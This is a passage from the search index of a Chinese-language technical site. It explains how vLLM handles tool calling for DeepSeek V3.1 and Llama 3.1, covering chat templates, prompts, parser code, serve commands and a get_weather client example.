\u83b7\u53d6\u6307\u5b9a\u57ce\u5e02\u7684\u5929\u6c14\u4fe1\u606f\n\nParameters: {\"type\":\"object\",\"properties\":{\"city\":{\"type\":\"string\",\"description\":\"\u57ce\u5e02\u540d\u79f0\"},\"unit\":{\"type\":\"string\",\"enum\":[\"celsius\",\"fahrenheit\"],\"description\":\"\u6e29\u5ea6\u5355\u4f4d\"}},\"required\":[\"city\"]}\n\nIMPORTANT: ALWAYS adhere to this exact format for tool use:\n&lt;\uff5ctool\u2581calls\u2581begin\uff5c&gt;&lt;\uff5ctool\u2581call\u2581begin\uff5c&gt;tool_call_name&lt;\uff5ctool\u2581sep\uff5c&gt;tool_call_arguments&lt;\uff5ctool\u2581call\u2581end\uff5c&gt;&lt;\uff5ctool\u2581calls\u2581end\uff5c&gt;\n\nWhere:\n\n- `tool_call_name` must be an exact match to one of the available tools\n- `tool_call_arguments` must be valid JSON that strictly follows the tool's Parameters Schema\n- For multiple tool calls, chain them directly without separators or spaces\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#3-prompt","title":"3. \u5b8c\u6574 Prompt\uff08\u53d1\u9001\u7ed9\u6a21\u578b\uff09","text":"<pre><code>&lt;\uff5cbegin\u2581of\u2581sentence\uff5c&gt;## Tools\nYou have access to the following tools:\n\n### get_weather\nDescription: \u83b7\u53d6\u6307\u5b9a\u57ce\u5e02\u7684\u5929\u6c14\u4fe1\u606f\n\nParameters: {\"type\":\"object\",\"properties\":{\"city\":{\"type\":\"string\",\"description\":\"\u57ce\u5e02\u540d\u79f0\"},\"unit\":{\"type\":\"string\",\"enum\":[\"celsius\",\"fahrenheit\"],\"description\":\"\u6e29\u5ea6\u5355\u4f4d\"}},\"required\":[\"city\"]}\n\nIMPORTANT: ALWAYS adhere to this exact format for tool use:\n&lt;\uff5ctool\u2581calls\u2581begin\uff5c&gt;&lt;\uff5ctool\u2581call\u2581begin\uff5c&gt;tool_call_name&lt;\uff5ctool\u2581sep\uff5c&gt;tool_call_arguments&lt;\uff5ctool\u2581call\u2581end\uff5c&gt;&lt;\uff5ctool\u2581calls\u2581end\uff5c&gt;\n\n&lt;\uff5cUser\uff5c&gt;\u5317\u4eac\u4eca\u5929\u5929\u6c14\u600e\u4e48\u6837\uff1f&lt;\uff5cAssistant\uff5c&gt;&lt;/think&gt;\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#4","title":"4. \u6a21\u578b\u8f93\u51fa","text":"<pre><code>&lt;\uff5ctool\u2581calls\u2581begin\uff5c&gt;&lt;\uff5ctool\u2581call\u2581begin\uff5c&gt;get_weather&lt;\uff5ctool\u2581sep\uff5c&gt;{\"city\":\"\u5317\u4eac\",\"unit\":\"celsius\"}&lt;\uff5ctool\u2581call\u2581end\uff5c&gt;&lt;\uff5ctool\u2581calls\u2581end\uff5c&gt;&lt;\uff5cend\u2581of\u2581sentence\uff5c&gt;\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#5-toolparser","title":"5. ToolParser \u89e3\u6790","text":"<p>\u6587\u4ef6: <code>vllm/entrypoints/openai/tool_parsers/deepseekv31_tool_parser.py</code></p> <p>\u5173\u952e\u4ee3\u7801\uff08\u7b2c 78-120 \u884c\uff09\uff1a</p> <pre><code>def extract_tool_calls(self, model_output: str, request) -&gt; ExtractedToolCallInformation:\n    # \u68c0\u67e5\u662f\u5426\u5305\u542b\u5de5\u5177\u8c03\u7528\u6807\u8bb0\n    if self.tool_calls_start_token not in model_output:\n        return ExtractedToolCallInformation(\n            tools_called=False, tool_calls=[], content=model_output\n        )\n\n    # \u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u63d0\u53d6\u5de5\u5177\u8c03\u7528\n    # \u6b63\u5219: &lt;\uff5ctool\u2581call\u2581begin\uff5c&gt;(?P&lt;function_name&gt;.*?)&lt;\uff5ctool\u2581sep\uff5c&gt;(?P&lt;function_arguments&gt;.*?)&lt;\uff5ctool\u2581call\u2581end\uff5c&gt;\n    function_call_tuples = self.tool_call_regex.findall(model_output)\n\n    tool_calls = []\n    for match in function_call_tuples:\n        function_name, function_args = match\n        tool_calls.append(\n            ToolCall(\n                type=\"function\",\n                function=FunctionCall(\n                    name=function_name,\n                    arguments=function_args  # \u4fdd\u6301\u4e3a JSON \u5b57\u7b26\u4e32\n                ),\n            )\n        )\n\n    # \u63d0\u53d6\u5de5\u5177\u8c03\u7528\u524d\u7684\u6587\u672c\u5185\u5bb9\n    content = model_output[:model_output.find(self.tool_calls_start_token)]\n\n    return ExtractedToolCallInformation(\n        tools_called=True,\n        tool_calls=tool_calls,\n        content=content if content else None,\n    )\n</code></pre> <p>\u89e3\u6790\u7ed3\u679c\uff1a</p> <pre><code>ExtractedToolCallInformation(\n    tools_called=True,\n    tool_calls=[\n        ToolCall(\n            type=\"function\",\n            function=FunctionCall(\n                name=\"get_weather\",\n                arguments='{\"city\":\"\u5317\u4eac\",\"unit\":\"celsius\"}'\n            )\n        )\n    ],\n    content=None\n)\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#6-openai","title":"6. \u8fd4\u56de\u7ed9\u7528\u6237\uff08OpenAI \u683c\u5f0f\uff09","text":"<pre><code>{\n  \"id\": \"chatcmpl-123\",\n  \"object\": \"chat.completion\",\n  \"created\": 1677652288,\n  \"model\": \"deepseek-ai/DeepSeek-V3.1\",\n  \"choices\": [\n    {\n      \"index\": 0,\n      \"message\": {\n        \"role\": \"assistant\",\n        \"content\": null,\n        \"tool_calls\": [\n          {\n            \"id\": \"call_abc123\",\n            \"type\": \"function\",\n            \"function\": {\n              \"name\": \"get_weather\",\n              \"arguments\": \"{\\\"city\\\":\\\"\u5317\u4eac\\\",\\\"unit\\\":\\\"celsius\\\"}\"\n            }\n          }\n        ]\n      },\n      \"finish_reason\": \"tool_calls\"\n    }\n  ]\n}\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#llama-31","title":"Llama 3.1 \u5b8c\u6574\u793a\u4f8b","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#1_1","title":"1. \u7528\u6237\u8bf7\u6c42","text":"<pre><code>payload = {\n    \"model\": \"meta-llama/Meta-Llama-3.1-8B-Instruct\",\n    \"messages\": [\n        {\"role\": \"user\", \"content\": \"What's the weather like in San Francisco?\"}\n    ],\n    \"tools\": [\n        {\n            \"type\": \"function\",\n            \"function\": {\n                \"name\": \"get_weather\",\n                \"description\": \"Get the current weather for a city\",\n                \"parameters\": {\n                    \"type\": \"object\",\n                    \"properties\": {\n                        \"city\": {\"type\": \"string\"},\n                        \"unit\": {\"type\": \"string\", \"enum\": [\"celsius\", \"fahrenheit\"]}\n                    },\n                    \"required\": [\"city\"]\n                }\n            }\n        }\n    ]\n}\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#2-chat-template_1","title":"2. Chat Template \u5904\u7406","text":"<p>\u6587\u4ef6: <code>examples/tool_chat_template_llama3.1_json.jinja</code></p> <p>\u5173\u952e\u4ee3\u7801\uff08\u7b2c 56-77 \u884c\uff09\uff1a</p> <pre><code>{%- if tools_in_user_message and not tools is none %}\n    {#- \u63d0\u53d6\u7b2c\u4e00\u6761\u7528\u6237\u6d88\u606f #}\n    {%- if messages[0]['content'] is string %}\n        {%- set first_user_message = messages[0]['content']|trim %}\n    {%- else %}\n        {%- set first_user_message = messages[0]['content'] | selectattr('type', 'equalto', 'text') | map(attribute='text') | map('trim') | join('\\n') %}\n    {%- endif %}\n    {%- set messages = messages[1:] %}\n\n    {{- '&lt;|start_header_id|&gt;user&lt;|end_header_id|&gt;\\n\\n' -}}\n    {{- \"Given the following functions, please respond with a JSON for a function call \" }}\n    {{- \"with its proper arguments that best answers the given prompt.\\n\\n\" }}\n    {{- 'Respond in the format {\"name\": function name, \"parameters\": dictionary of argument name and its value}. ' }}\n    {{- \"Do not use variables.\\n\\n\" }}\n    {%- for t in tools %}\n        {{- t | tojson(indent=4) }}\n        {{- \"\\n\\n\" }}\n    {%- endfor %}\n    {{- first_user_message + \"&lt;|eot_id|&gt;\"}}\n{%- endif %}\n</code></pre> <p>\u751f\u6210\u7684\u5de5\u5177\u63cf\u8ff0\uff08\u6ce8\u5165\u5230\u7b2c\u4e00\u6761\u7528\u6237\u6d88\u606f\uff09\uff1a</p> <pre><code>&lt;|start_header_id|&gt;user&lt;|end_header_id|&gt;\n\nGiven the following functions, please respond with a JSON for a function call with its proper arguments that best answers the given prompt.\n\nRespond in the format {\"name\": function name, \"parameters\": dictionary of argument name and its value}. Do not use variables.\n\n{\n    \"type\": \"function\",\n    \"function\": {\n        \"name\": \"get_weather\",\n        \"description\": \"Get the current weather for a city\",\n        \"parameters\": {\n            \"type\": \"object\",\n            \"properties\": {\n                \"city\": {\n                    \"type\": \"string\"\n                },\n                \"unit\": {\n                    \"type\": \"string\",\n                    \"enum\": [\n                        \"celsius\",\n                        \"fahrenheit\"\n                    ]\n                }\n            },\n            \"required\": [\n                \"city\"\n            ]\n        }\n    }\n}\n\nWhat's the weather like in San Francisco?&lt;|eot_id|&gt;\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#3-prompt_1","title":"3. \u5b8c\u6574 Prompt\uff08\u53d1\u9001\u7ed9\u6a21\u578b\uff09","text":"<pre><code>&lt;|begin_of_text|&gt;&lt;|start_header_id|&gt;system&lt;|end_header_id|&gt;\n\nEnvironment: ipython\nCutting Knowledge Date: December 2023\nToday Date: 26 Jul 2024\n\nYou are a helpful assistant with tool calling capabilities. Only reply with a tool call if the function exists in the library provided by the user. If it doesn't exist, just reply directly in natural language. When you receive a tool call response, use the output to format an answer to the original user question.&lt;|eot_id|&gt;&lt;|start_header_id|&gt;user&lt;|end_header_id|&gt;\n\nGiven the following functions, please respond with a JSON for a function call with its proper arguments that best answers the given prompt.\n\nRespond in the format {\"name\": function name, \"parameters\": dictionary of argument name and its value}. Do not use variables.\n\n{\n    \"type\": \"function\",\n    \"function\": {\n        \"name\": \"get_weather\",\n        \"description\": \"Get the current weather for a city\",\n        \"parameters\": {\n            \"type\": \"object\",\n            \"properties\": {\n                \"city\": {\"type\": \"string\"},\n                \"unit\": {\"type\": \"string\", \"enum\": [\"celsius\", \"fahrenheit\"]}\n            },\n            \"required\": [\"city\"]\n        }\n    }\n}\n\nWhat's the weather like in San Francisco?&lt;|eot_id|&gt;&lt;|start_header_id|&gt;assistant&lt;|end_header_id|&gt;\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#4_1","title":"4. \u6a21\u578b\u8f93\u51fa","text":"<pre><code>{\"name\": \"get_weather\", \"parameters\": {\"city\": \"San Francisco\", \"unit\": \"celsius\"}}\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#5-toolparser_1","title":"5. ToolParser \u89e3\u6790","text":"<p>\u6587\u4ef6: <code>vllm/entrypoints/openai/tool_parsers/llama_tool_parser.py</code></p> <p>\u5173\u952e\u4ee3\u7801\uff08\u7b2c 69-125 \u884c\uff09\uff1a</p> <pre><code>def extract_tool_calls(self, model_output: str, request) -&gt; ExtractedToolCallInformation:\n    # \u5feb\u901f\u68c0\u67e5\n    if not (self.bot_token in model_output or \"{\" in model_output):\n        return ExtractedToolCallInformation(\n            tools_called=False, tool_calls=[], content=model_output\n        )\n\n    # \u4f7f\u7528\u6b63\u5219\u67e5\u627e JSON \u5bf9\u8c61\n    match = self.tool_call_regex.search(model_output)\n    if not match:\n        return ExtractedToolCallInformation(\n            tools_called=False, tool_calls=[], content=model_output\n        )\n\n    try:\n        json_str = match.group(0)\n        # \u652f\u6301\u5206\u53f7\u5206\u9694\u7684\u591a\u4e2a JSON\n        json_objects = [obj.strip() for obj in json_str.split(\";\")]\n\n        tool_calls = []\n        for json_obj in json_objects:\n            if not json_obj:\n                continue\n            obj = json.loads(json_obj)\n            tool_calls.append(\n                ToolCall(\n                    type=\"function\",\n                    function=FunctionCall(\n                        name=obj[\"name\"],\n                        arguments=json.dumps(\n                            obj[\"arguments\"] if \"arguments\" in obj else obj[\"parameters\"],\n                            ensure_ascii=False\n                        )\n                    )\n                )\n            )\n\n        return ExtractedToolCallInformation(\n            tools_called=True,\n            tool_calls=tool_calls,\n            content=None\n        )\n\n    except Exception:\n        logger.exception(\"Error in extracting tool call from response.\")\n        return ExtractedToolCallInformation(\n            tools_called=False, tool_calls=[], content=model_output\n        )\n</code></pre> <p>\u89e3\u6790\u7ed3\u679c\uff1a</p> <pre><code>ExtractedToolCallInformation(\n    tools_called=True,\n    tool_calls=[\n        ToolCall(\n            type=\"function\",\n            function=FunctionCall(\n                name=\"get_weather\",\n                arguments='{\"city\":\"San Francisco\",\"unit\":\"celsius\"}'\n            )\n        )\n    ],\n    content=None\n)\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#_4","title":"\u4e24\u8005\u5bf9\u6bd4","text":"\u7279\u6027 DeepSeek V3.1 Llama 3.1 \u5de5\u5177\u63cf\u8ff0\u6ce8\u5165\u4f4d\u7f6e System Prompt\uff08\u7b2c 25 \u884c\uff09 \u7b2c\u4e00\u6761 User Message\uff08\u7b2c 77 \u884c\uff09 \u5de5\u5177\u5b9a\u4e49\u683c\u5f0f Markdown \u98ce\u683c\uff08## Tools, ### function_name\uff09 JSON \u683c\u5f0f\uff08\u5b8c\u6574 tool schema\uff09 \u8f93\u51fa\u683c\u5f0f Special Tokens\uff1a<code>&lt;\uff5ctool\u2581call\u2581begin\uff5c&gt;name&lt;\uff5ctool\u2581sep\uff5c&gt;args&lt;\uff5ctool\u2581call\u2581end\uff5c&gt;</code> Pure JSON\uff1a<code>{\"name\": \"...\", \"parameters\": {...}}</code> \u89e3\u6790\u65b9\u5f0f \u6b63\u5219\u63d0\u53d6 special token \u5305\u88f9\u7684\u5185\u5bb9 \u6b63\u5219\u67e5\u627e JSON \u5bf9\u8c61 + JSON \u89e3\u6790 \u591a\u5de5\u5177\u8c03\u7528 \u94fe\u5f0f\uff1a<code>&lt;\uff5ctool\u2581call\u2581begin\uff5c&gt;...\uff5c&gt;&lt;\uff5ctool\u2581call\u2581begin\uff5c&gt;...</code> \u5206\u53f7\u5206\u9694\uff1a<code>{...}; {...}</code> Template \u6587\u4ef6 <code>tool_chat_template_deepseekv31.jinja</code> <code>tool_chat_template_llama3.1_json.jinja</code> Parser \u7c7b <code>DeepSeekV31ToolParser</code> <code>Llama3JsonToolParser</code> \u542f\u52a8\u53c2\u6570 <code>--tool-call-parser deepseek_v31</code> <code>--tool-call-parser llama3_json</code>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#_5","title":"\u6e90\u7801\u89e3\u6790","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#1_2","title":"1. \u670d\u52a1\u5c42\u96c6\u6210","text":"<p>\u6587\u4ef6: <code>vllm/entrypoints/openai/serving_engine.py:1094-1108</code></p> <pre><code># \u68c0\u67e5\u662f\u5426\u9700\u8981\u89e3\u6790\u5de5\u5177\u8c03\u7528\nshould_parse_tools = tool_parser is not None and (\n    hasattr(request, \"tool_choice\") and request.tool_choice != \"none\"\n)\n\nif should_parse_tools:\n    if not isinstance(request, ChatCompletionRequest):\n        msg = \"Tool usage is only supported for Chat Completions API\"\n        raise NotImplementedError(msg)\n\n    # \u8c03\u7528 ToolParser \u7684 adjust_request() \u65b9\u6cd5\n    # DeepSeek V3.1 \u6ca1\u6709\u91cd\u5199\u6b64\u65b9\u6cd5\uff0c\u76f4\u63a5\u8fd4\u56de\u539f\u8bf7\u6c42\n    # \u67d0\u4e9b parser \u53ef\u80fd\u4f1a\u4fee\u6539\u8bf7\u6c42\uff08\u5982\u6dfb\u52a0\u989d\u5916\u7684 system message\uff09\n    request = tool_parser(tokenizer).adjust_request(request=request)\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#2-chat-template_2","title":"2. Chat Template \u5e94\u7528","text":"<p>\u6587\u4ef6: <code>vllm/entrypoints/chat_utils.py:1525-1561</code></p> <pre><code>def apply_hf_chat_template(\n    tokenizer: PreTrainedTokenizer | PreTrainedTokenizerFast,\n    conversation: list[ConversationMessage],\n    chat_template: str | None,\n    tools: list[dict[str, Any]] | None,\n    *,\n    model_config: ModelConfig,\n    **kwargs: Any,\n) -&gt; str:\n    # \u89e3\u6790 chat template\uff08\u53ef\u80fd\u662f\u81ea\u5b9a\u4e49\u7684\uff0c\u4e5f\u53ef\u80fd\u662f tokenizer \u81ea\u5e26\u7684\uff09\n    hf_chat_template = resolve_hf_chat_template(\n        tokenizer,\n        chat_template=chat_template,\n        tools=tools,\n        model_config=model_config,\n    )\n\n    if hf_chat_template is None:\n        raise ValueError(\"Chat template is required\")\n\n    # \u89e3\u6790\u6a21\u677f\u4e2d\u4f7f\u7528\u7684\u53d8\u91cf\n    resolved_kwargs = resolve_chat_template_kwargs(\n        tokenizer=tokenizer,\n        chat_template=hf_chat_template,\n        chat_template_kwargs=kwargs,\n    )\n\n    # \u8c03\u7528 tokenizer \u7684 apply_chat_template\n    # tools \u53c2\u6570\u4f1a\u88ab\u4f20\u5165 Jinja2 \u6a21\u677f\u4e2d\n    return tokenizer.apply_chat_template(\n        conversation=conversation,\n        tools=tools,  # \u2190 \u5173\u952e\uff1a\u4f20\u5165 tools\n        chat_template=hf_chat_template,\n        tokenize=False,\n        **resolved_kwargs,\n    )\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#3","title":"3. \u8f93\u51fa\u89e3\u6790\uff08\u6d41\u5f0f\uff09","text":"<p>\u6587\u4ef6: <code>vllm/entrypoints/openai/serving_chat.py:974-988</code></p> <pre><code># \u5728\u6d41\u5f0f\u8f93\u51fa\u7684\u6bcf\u4e2a chunk \u4e2d\u8c03\u7528\nif tool_parser:\n    delta_message = tool_parser.extract_tool_calls_streaming(\n        previous_text=previous_text,\n        current_text=current_text,\n        delta_text=delta_text,\n        previous_token_ids=previous_token_ids,\n        current_token_ids=current_token_ids,\n        delta_token_ids=delta_token_ids,\n        request=request,\n    )\n\n    # delta_message \u53ef\u80fd\u5305\u542b\uff1a\n    # - content: \u666e\u901a\u6587\u672c\n    # - tool_calls: \u5de5\u5177\u8c03\u7528\u7684\u589e\u91cf\u66f4\u65b0\n    #   - index: \u5de5\u5177\u8c03\u7528\u7684\u7d22\u5f15\uff08\u652f\u6301\u591a\u4e2a\u5de5\u5177\uff09\n    #   - function.name: \u9996\u6b21\u51fa\u73b0\u65f6\u53d1\u9001\n    #   - function.arguments: \u589e\u91cf\u53d1\u9001\uff08\u5982 \"{\\\"city\\\"\" -&gt; \":\\\"Beijing\\\"}\")\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#4-toolparser","title":"4. ToolParser \u6ce8\u518c\u673a\u5236","text":"<p>\u6587\u4ef6: <code>vllm/entrypoints/openai/tool_parsers/abstract_tool_parser.py:86-155</code></p> <pre><code>class ToolParserManager:\n    tool_parsers: dict[str, type] = {}\n\n    @classmethod\n    def register_module(cls, name: str | list[str] | None = None, ...):\n        \"\"\"\u88c5\u9970\u5668\uff0c\u7528\u4e8e\u6ce8\u518c ToolParser\"\"\"\n        def _register(module):\n            cls._register_module(module=module, module_name=name, ...)\n            return module\n        return _register\n\n    @classmethod\n    def get_tool_parser(cls, name) -&gt; type:\n        \"\"\"\u6839\u636e\u540d\u79f0\u83b7\u53d6 ToolParser \u7c7b\"\"\"\n        if name in cls.tool_parsers:\n            return cls.tool_parsers[name]\n        raise KeyError(f\"tool helper: '{name}' not found\")\n</code></pre> <p>\u4f7f\u7528\u793a\u4f8b\uff1a</p> <pre><code># \u5728 deepseekv31_tool_parser.py \u4e2d\n@ToolParserManager.register_module(\"deepseek_v31\")\nclass DeepSeekV31ToolParser(ToolParser):\n    ...\n\n# \u5728 llama_tool_parser.py \u4e2d\n@ToolParserManager.register_module(\"llama3_json\")\n@ToolParserManager.register_module(\"llama4_json\")\nclass Llama3JsonToolParser(ToolParser):\n    ...\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#_6","title":"\u5b9e\u6218\u6307\u5357","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#vllm_1","title":"\u542f\u52a8 vLLM \u670d\u52a1\u5668","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#deepseek-v31_1","title":"DeepSeek V3.1","text":"<pre><code>vllm serve deepseek-ai/DeepSeek-V3.1 \\\n  --enable-auto-tool-choice \\\n  --tool-call-parser deepseek_v31 \\\n  --chat-template examples/tool_chat_template_deepseekv31.jinja\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#llama-31_1","title":"Llama 3.1","text":"<pre><code>vllm serve meta-llama/Meta-Llama-3.1-8B-Instruct \\\n  --enable-auto-tool-choice \\\n  --tool-call-parser llama3_json \\\n  --chat-template examples/tool_chat_template_llama3.1_json.jinja\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#_7","title":"\u53d1\u9001\u8bf7\u6c42","text":"<pre><code>from openai import OpenAI\n\nclient = OpenAI(\n    base_url=\"http://localhost:8000/v1\",\n    api_key=\"EMPTY\"\n)\n\ntools = [\n    {\n        \"type\": \"function\",\n        \"function\": {\n            \"name\": \"get_weather\",\n            \"description\": \"Get weather info\",\n            \"parameters\": {\n                \"type\": \"object\",\n                \"properties\": {\n                    \"city\": {\"type\": \"string\"}\n                },\n                \"required\": [\"city\"]\n            }\n        }\n    }\n]\n\nresponse = client.chat.completions.create(\n    model=\"deepseek-ai/DeepSeek-V3.1\",\n    messages=[\n        {\"role\": \"user\", \"content\": \"What's the weather in Beijing?\"}\n    ],\n    tools=tools,\n    tool_choice=\"auto\"\n)\n\n# \u5904\u7406\u5de5\u5177\u8c03\u7528\nif response.choices[0].message.tool_calls:\n    for tool_call in response.choices[0].message.tool_calls:\n        print(f\"Tool: {tool_call.function.name}\")\n        print(f\"Args: {tool_call.function.arguments}\")\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#_8","title":"\u591a\u8f6e\u5bf9\u8bdd\uff08\u5de5\u5177\u8c03\u7528 + \u5de5\u5177\u8f93\u51fa + \u6700\u7ec8\u56de\u7b54\uff09","text":"<pre><code># \u7b2c\u4e00\u8f6e\uff1a\u7528\u6237\u8bf7\u6c42\nmessages = [\n    {\"role\": \"user\", \"content\": \"What's the weather in Tokyo?\"}\n]\n\nresponse1 = client.chat.completions.create(\n    model=\"deepseek-ai/DeepSeek-V3.1\",\n    messages=messages,\n    tools=tools\n)\n\n# \u63d0\u53d6\u5de5\u5177\u8c03\u7528\ntool_call = response1.choices[0].message.tool_calls[0]\nmessages.append(response1.choices[0].message)\n\n# \u7b2c\u4e8c\u8f6e\uff1a\u8fd4\u56de\u5de5\u5177\u6267\u884c\u7ed3\u679c\nmessages.append({\n    \"role\": \"tool\",\n    \"tool_call_id\": tool_call.id,\n    \"content\": '{\"temperature\": 18, \"condition\": \"sunny\"}'\n})\n\n# \u7b2c\u4e09\u8f6e\uff1a\u83b7\u53d6\u6700\u7ec8\u56de\u7b54\nresponse2 = client.chat.completions.create(\n    model=\"deepseek-ai/DeepSeek-V3.1\",\n    messages=messages,\n    tools=tools\n)\n\nprint(response2.choices[0].message.content)\n# \u8f93\u51fa: \"The weather in Tokyo is currently sunny with a temperature of 18\u00b0C.\"\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#toolparser","title":"\u81ea\u5b9a\u4e49 ToolParser","text":"<p>\u5982\u679c\u4f60\u60f3\u4e3a\u81ea\u5df1\u7684\u6a21\u578b\u5b9e\u73b0 tool calling\uff0c\u9700\u8981\uff1a</p> <ol> <li>\u521b\u5efa\u81ea\u5b9a\u4e49 chat template\uff08<code>.jinja</code> \u6587\u4ef6\uff09</li> <li>\u5b9e\u73b0 ToolParser \u5b50\u7c7b</li> <li>\u6ce8\u518c ToolParser</li> </ol> <p>\u793a\u4f8b\uff1a</p> <pre><code># my_tool_parser.py\nimport regex as re\nfrom vllm.entrypoints.openai.tool_parsers import (\n    ToolParser, ToolParserManager\n)\n\n@ToolParserManager.register_module(\"my_custom_parser\")\nclass MyCustomToolParser(ToolParser):\n    def __init__(self, tokenizer):\n        super().__init__(tokenizer)\n        # \u5b9a\u4e49\u4f60\u7684 special tokens\n        self.tool_start = \"&lt;|tool|&gt;\"\n        self.tool_end = \"&lt;|/tool|&gt;\"\n        # \u5b9a\u4e49\u6b63\u5219\u8868\u8fbe\u5f0f\n        self.regex = re.compile(r\"&lt;\\|tool\\|&gt;(.*?)&lt;\\|/tool\\|&gt;\", re.DOTALL)\n\n    def extract_tool_calls(self, model_output, request):\n        # \u5b9e\u73b0\u89e3\u6790\u903b\u8f91\n        matches = self.regex.findall(model_output)\n        # ... \u5904\u7406\u5e76\u8fd4\u56de ExtractedToolCallInformation\n\n    def extract_tool_calls_streaming(self, ...):\n        # \u5b9e\u73b0\u6d41\u5f0f\u89e3\u6790\u903b\u8f91\n        # ... \u8fd4\u56de DeltaMessage\n</code></pre> <p>\u542f\u52a8\u65f6\u6307\u5b9a\uff1a</p> <pre><code>vllm serve my-model \\\n  --enable-auto-tool-choice \\\n  --tool-call-parser my_custom_parser \\\n  --tool-parser-plugin /path/to/my_tool_parser.py \\\n  --chat-template 